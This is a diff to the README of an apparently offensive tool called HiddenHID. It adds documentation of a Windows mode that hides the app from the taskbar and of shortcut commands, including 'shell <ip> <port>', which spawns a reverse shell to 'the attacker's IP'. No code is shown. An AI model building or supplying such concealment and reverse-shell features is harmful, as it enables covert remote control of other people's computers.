@@ -14,11 +14,33 @@ HiddenHID also has several built-in "shortcut" commands. They help automate long
 - When HiddenHID closes, it force-quits all terminals with AppleScript
 
 ## Windows-Specific Features
-- Coming soon; I'm working on macOS right now
+- The app doesn't appear in the app/task bar, so there's no sign that HiddenHID is actually running (minus Task Manager)
 
 ## Linux-Specific Features
 So many things change depending on the distro, I'm not sure if I'll ever add Linux-specific features. If I do, they
 will come after the Windows ones.
 
 # Shortcut Commands
-WIP :P
+When typing a command into HiddenHID, you can type a shortcut name instead to run that shortcut.
+## macOS Shortcuts:
+### Wallpaper
+Format: `wallpaper <url>`, where `<url>` is the url of the image to set as the wallpaper.
+
+This shortcut downloads the image, saves it to a file, sets it as the wallpaper, and then deletes the file.
+### Volume
+Format: `volume <amount>`, where amount is the volume (From 0 to 10)
+
+This shortcut sets the computer's volume to the provided value.
+### Mute
+Format: `mute`
+
+This shortcut sets the computer's volume to 0.
+### Shell
+Format: `shell <ip> <port>`, where `<ip>` is the attacker's IP and `<port>` is the port of the listener.
+
+This shortcut spawns a reverse shell to the provided IP and port.
+## Windows Shortcuts:
+### Shell
+Format: `shell <ip> <port>`, where `<ip>` is the attacker's IP and `<port>` is the port of the listener.
+
+This shortcut spawns a reverse shell to the provided IP and port.
